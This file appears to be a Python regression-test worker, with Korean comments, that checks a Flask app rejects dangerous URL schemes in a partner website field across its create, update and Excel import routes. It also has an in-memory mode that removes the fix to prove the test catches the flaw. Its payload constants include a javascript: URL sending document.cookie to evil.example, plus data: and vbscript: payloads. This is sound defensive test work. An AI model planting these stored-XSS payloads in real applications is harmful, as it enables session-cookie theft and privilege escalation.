# -*- coding: utf-8 -*-
"""라운드509 회귀 워커(test_scan_round509_fixes.py 전용 서브프로세스) —
스크래치 DB에서 실제 Flask 앱으로 partners.website 의 세 진입로
(api_partner_create·api_partner_update·api_contact_import 엑셀 일괄등록)
전부에 위험한 URL 스킴("javascript:...")과 정상 값(https:// · 스킴 없는
도메인)을 실제로 보내 그 결과를 그대로 출력한다. app.py 의 현재 상태
(고쳐진 것이든, 되돌림-증명을 위해 임시로 되돌린 것이든)를 그대로
반영한다 — 이 파일 자신은 절대 수정 대상이 아니다.

★ 세션 등급을 일부러 **하위관리자**(가장 낮은 등급)로 세팅한다 —
  require_admin 은 등급을 전혀 안 보므로, 이 결함이 실제로는
  "가장 낮은 등급 관리자가 심은 값을 최고관리자가 클릭하면 그 세션에서
  실행된다"는 등급상승 경로임을 그대로 보여준다.
"""
import io
import json
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
_tmpdir = tempfile.mkdtemp(prefix="r509_worker_")
os.environ["BOKGUON_DB_PATH"] = os.path.join(_tmpdir, "verify.db")
os.environ["BOKGUON_UPLOAD_DIR"] = os.path.join(_tmpdir, "uploads")
os.environ["BOKGUON_ENV"] = "dev"
os.environ["BOKGUON_SEED_DEMO"] = "0"
sys.path.insert(0, HERE)

import db as DB               # noqa: E402
DB.init_db()
conn = DB.get_db()
conn.execute("INSERT INTO admins(username,password_hash,name,role) "
             "VALUES('lowadmin','x','말단직원','하위관리자')")
pid = conn.execute(
    "INSERT INTO partners(name,partner_type,status,lat,lng) "
    "VALUES('R509업체','시행사','활성',37.5,127.0)").lastrowid
conn.commit()
conn.close()

import app as A                # noqa: E402

if os.environ.get("R509_BROKEN") == "1":
    #  ⚠⚠ [라운드625] 되돌림-증명용 — 실제 app.py 파일은 이 서브프로세스에서도
    #    전혀 안 건드린다. 세 라우트(create·update·import) 전부 독립된 Flask
    #    라우트라 기법1(view_functions 딕셔너리 스왑) — 이 프로세스 안에서
    #    app.py 소스를 다시 읽어(디스크는 원본 그대로) 세 자리의 검사 블록만
    #    제거한 버전을 exec 해 view_functions 에 갈아 끼운다. 메인 테스트
    #    프로세스(test_scan_round509_fixes.py)의 BLOCK_CREATE/UPDATE/IMPORT
    #    상수와 같은 문자열이다(그 파일의 [1]이 이미 소스에 정확히 한 번씩
    #    있음을 검증한다) — 이 워커는 별개 인터프리터라 상태를 못 물려받으므로
    #    부득이 그대로 다시 옮겨 적었다.
    _APP_PATH = os.path.join(HERE, "app.py")
    _APP_SRC = io.open(_APP_PATH, encoding="utf-8").read()

    def _py_fn_body(src, fn_name):
        start = src.index(f"\ndef {fn_name}(")
        end = src.find("\ndef ", start + 1)
        dec = src.find("\n@app.", start + 1)
        if dec != -1 and (end == -1 or dec < end):
            end = dec
        return src[start:end if end != -1 else None]

    _BLOCKS = {
        "api_partner_create": (
            '    #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등) 검사 —\n'
            '    #    valid_website() 주석(5508행 부근) 참고.\n'
            '    #  ⚠⚠ [라운드609] valid_website() 내부도 raw (v or "").strip() 없는 re.sub라\n'
            '    #    d["website"]가 비문자열 truthy면 TypeError — _s() 로 감싼다.\n'
            '    if d.get("website") and not valid_website(_s(d.get("website"))):\n'
            '        return jsonify({"ok": False,\n'
            '                        "error": "홈페이지 주소는 http:// 또는 https:// 로 시작해야 합니다."}), 400\n'
        ),
        "api_partner_update": (
            '            #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등) 검사 —\n'
            '            #    valid_website() 주석(5508행 부근) 참고. 이 실사용 경로(관리자\n'
            '            #    정보수정)는 등급 무관(require_admin)이라 하위관리자도 통과한다.\n'
            '            if f == "website" and d[f] and not valid_website(_s(d[f])):\n'
            '                return jsonify({"ok": False,\n'
            '                                "error": "홈페이지 주소는 http:// 또는 https:// 로 시작해야 합니다."}), 400\n'
        ),
        "api_contact_import": (
            '                        #  ⚠⚠ [라운드509] website 의 위험한 URL 스킴(javascript: 등)\n'
            '                        #    검사 — valid_website() 주석(5508행 부근) 참고. 엑셀\n'
            '                        #    일괄등록도 admin.js ctEdit() 가 그대로 읽어 <a href> 에\n'
            '                        #    꽂는 같은 값을 채운다 — 같은 스킵+보고 관례를 따른다.\n'
            '                        if field == "website" and not valid_website(v):\n'
            '                            errs.append(f"\'{name}\' 홈페이지 주소 오류(http/https만 허용): {v}")\n'
            '                            continue\n'
        ),
    }

    for _fn_name, _block in _BLOCKS.items():
        _body = _py_fn_body(_APP_SRC, _fn_name)
        assert _block in _body, f"{_fn_name}: 되돌림 대상 블록을 못 찾음(app.py 변경?)"
        _broken_body = _body.replace(_block, "", 1)
        assert _broken_body != _body
        _ns = dict(vars(A))
        exec(compile(_broken_body, f"<r509_broken_{_fn_name}>", "exec"), _ns)  # noqa: S102 -- 실소스 그대로 추출, 디스크 미기록
        A.app.view_functions[_fn_name] = A.require_admin(_ns[_fn_name])

XSS = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"
XSS_DATA = "data:text/html,<script>alert(1)</script>"
XSS_VBS = "vbscript:msgbox(1)"
GOOD_HTTPS = "https://example.com"
GOOD_HTTP = "http://example.co.kr/path"
GOOD_BARE = "example.com"          # 스킴 없음 — 지금 운영 데이터에도 있는 형태, 막으면 안 된다


def _lowadmin_client():
    c = A.app.test_client()
    with c.session_transaction() as sess:
        sess["admin"] = "lowadmin"; sess["admin_name"] = "말단직원"
        sess["admin_role"] = "하위관리자"; sess["_csrf"] = "r509-csrf"
    return c


H = {"X-CSRF-Token": "r509-csrf"}
c = _lowadmin_client()
out = {}

# [1] api_partner_create — 하위관리자가 새 업체를 등록하며 website 에 XSS 페이로드
r = c.post("/api/partners", json={"name": "R509신규A", "website": XSS}, headers=H)
out["create_xss_status"] = r.status_code
out["create_xss_body"] = r.get_json()
r = c.post("/api/partners", json={"name": "R509신규B", "website": GOOD_HTTPS}, headers=H)
out["create_good_https_status"] = r.status_code
r = c.post("/api/partners", json={"name": "R509신규C", "website": GOOD_BARE}, headers=H)
out["create_good_bare_status"] = r.status_code

# [2] api_partner_update — 하위관리자가 기존 업체(pid)의 website 를 XSS 페이로드로
r = c.patch(f"/api/partners/{pid}", json={"website": XSS}, headers=H)
out["update_xss_status"] = r.status_code
out["update_xss_body"] = r.get_json()
#  ⚠ 되돌림-증명(옛 코드)에서는 이 PATCH 가 실제로 통과해 값을 덮어쓴다 —
#    그 값을 다음 두 시도(XSS_DATA·XSS_VBS)가 다시 덮어쓰기 전에, 이 첫
#    시도만으로 DB 가 어떻게 됐는지 여기서 바로 읽는다(고친 코드는 셋 다
#    거부되어 NULL 그대로, 옛 코드는 셋 다 통과해 마지막 것으로 덮이므로
#    "첫 시도 직후" 를 봐야 셋 중 어느 페이로드가 실제로 심겼는지 정확히
#    XSS 하나로 특정할 수 있다).
conn2 = DB.get_db()
out["db_website_after_xss_attempt"] = (conn2.execute(
    "SELECT website FROM partners WHERE id=?", (pid,)).fetchone() or {"website": None})["website"]
conn2.close()
r = c.patch(f"/api/partners/{pid}", json={"website": XSS_DATA}, headers=H)
out["update_xss_data_status"] = r.status_code
r = c.patch(f"/api/partners/{pid}", json={"website": XSS_VBS}, headers=H)
out["update_xss_vbs_status"] = r.status_code
r = c.patch(f"/api/partners/{pid}", json={"website": GOOD_HTTP}, headers=H)
out["update_good_http_status"] = r.status_code
conn3 = DB.get_db()
out["db_website_after_good"] = (conn3.execute(
    "SELECT website FROM partners WHERE id=?", (pid,)).fetchone() or {"website": None})["website"]
conn3.close()

# [3] api_contact_import — 엑셀 일괄등록의 "홈페이지" 열
from openpyxl import Workbook
wb = Workbook()
ws = wb.active
ws.append(["업체명", "사업자번호", "이메일", "보조이메일", "연락처", "담당자", "메모", "홈페이지", "메일수신거부"])
ws.append(["R509업체", "", "", "", "", "", "", XSS, ""])
xlsx_path = os.path.join(_tmpdir, "import.xlsx")
wb.save(xlsx_path)
with open(xlsx_path, "rb") as f:
    r = c.post("/api/contacts/import", data={"file": (f, "import.xlsx")},
               content_type="multipart/form-data", headers=H)
out["import_xss_status"] = r.status_code
out["import_xss_body"] = r.get_json()
conn4 = DB.get_db()
out["db_website_after_import_xss"] = (conn4.execute(
    "SELECT website FROM partners WHERE id=?", (pid,)).fetchone() or {"website": None})["website"]
conn4.close()

# 정상 값(스킴 없는 도메인)은 엑셀 일괄등록으로도 그대로 통과해야 한다(과잉차단 아님)
wb2 = Workbook()
ws2 = wb2.active
ws2.append(["업체명", "사업자번호", "이메일", "보조이메일", "연락처", "담당자", "메모", "홈페이지", "메일수신거부"])
ws2.append(["R509업체", "", "", "", "", "", "", GOOD_BARE, ""])
xlsx_path2 = os.path.join(_tmpdir, "import2.xlsx")
wb2.save(xlsx_path2)
with open(xlsx_path2, "rb") as f:
    r = c.post("/api/contacts/import", data={"file": (f, "import2.xlsx")},
               content_type="multipart/form-data", headers=H)
out["import_good_bare_status"] = r.status_code
out["import_good_bare_body"] = r.get_json()
conn5 = DB.get_db()
out["db_website_after_import_good"] = (conn5.execute(
    "SELECT website FROM partners WHERE id=?", (pid,)).fetchone() or {"website": None})["website"]
conn5.close()

print(json.dumps(out, ensure_ascii=False))
